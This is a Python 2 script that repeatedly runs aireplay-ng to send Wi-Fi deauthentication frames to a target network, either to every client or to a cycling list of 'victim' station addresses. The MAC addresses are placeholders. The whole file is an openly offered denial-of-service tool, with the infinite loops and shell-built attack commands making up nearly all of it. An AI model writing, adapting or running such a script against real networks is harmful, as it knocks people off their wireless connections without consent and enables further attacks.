#! /usr/bin/env python

import subprocess

#Network with various known associated stations:
#network = '00:00:00:00:00:00'
#victims = ['00:00:00:00:00:11' , '00:00:00:00:00:22', '00:00:00:00:00:33', '00:00:00:00:00:44', '00:00:00:00:00:55']

#Network without any known associated station:
network = '00:00:00:00:00:00'
victims = []


#Welcome Message
print
print chr(27)+"[1;31m"+"[" + chr(27)+"[0m"+"+" + chr(27)+"[1;31m"+"] " +chr(27)+"[1;34m"+"WELCOME TO THE WI-FI DEAUTHENTICATION SCRIPT"
print chr(27)+"[0m"
victimsCont = 0

print chr(27)+"[1;31m"+"[" + chr(27)+"[0m"+"+" + chr(27)+"[1;31m"+"] " +chr(27)+"[1;34m"+"Victim Network:"
print chr(27)+"[0m" + "       - " + network
print

print chr(27)+"[1;31m"+"[" + chr(27)+"[0m"+"+" + chr(27)+"[1;31m"+"] " +chr(27)+"[1;34m"+"Victim stations:"
while victimsCont < len(victims):
    print chr(27)+"[0m" + "       - " + victims[victimsCont]
    victimsCont = victimsCont + 1
print
victimsCont = 0

#DoS without specifying victims (Here, using aireplay-ng in spite of this script should be more efficient):
if len(victims) == 0:
    while 1:
        command = "aireplay-ng -a " + network + " -0 5 mon0"
        print
        print chr(27)+"[1;31m"+"[" + chr(27)+"[0m"+"+" + chr(27)+"[1;31m"+"]" +chr(27)+"[0;34m"+" Deauthenticating any client in the network " + network
        print chr(27)+"[0m"
        subprocess.call([command], shell = True)

#DoS especificying victims:
while 1:
    command = "aireplay-ng -a " + network + " -c " + victims[victimsCont] + " -0 3 mon0"
    print
    print chr(27)+"[1;31m"+"[" + chr(27)+"[0m"+"+" + chr(27)+"[1;31m"+"]" +chr(27)+"[0;34m"+" Deauthenticating " + victims[victimsCont]
    print chr(27)+"[0m"
    subprocess.call([command], shell = True)
    victimsCont = victimsCont + 1
    if victimsCont >= len(victims):
        victimsCont = 0
